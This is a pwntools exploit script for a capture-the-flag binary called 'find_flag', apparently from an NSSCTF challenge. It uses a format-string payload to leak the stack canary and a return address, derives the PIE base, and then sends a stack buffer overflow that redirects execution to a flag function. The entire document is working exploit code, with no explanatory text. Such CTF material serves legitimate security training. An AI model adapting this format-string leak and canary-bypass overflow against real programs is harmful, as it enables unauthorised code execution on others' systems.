from pwn import *

context(arch="amd64", os="linux", log_level="info")
context.gdb_binary = "/bin/pwndbg"

io = process("./find_flag")
#io = remote(b"node4.anna.nssctf.cn", 25152)

# offset = 6
payload = b"%17$p*%19$p"

io.sendline(payload)
io.recvuntil(b"0x")
canary = int(io.recvuntil(b"00"), 16)
io.recvuntil(b"*")
ret_addr = int(io.recv(14), 16)

base_addr = ret_addr - 0x146f
flag_addr = base_addr + 0x1231
print(f"canary address = {hex(canary)}\nreturn address = {hex(ret_addr)}\nbase address = {hex(base_addr)}")
print(f"flag address = {hex(flag_addr)}")

payload = b"a" * (0x40-0x8) + p64(canary) + b"a" * 8 + p64(flag_addr)
io.sendline(payload)

io.interactive()
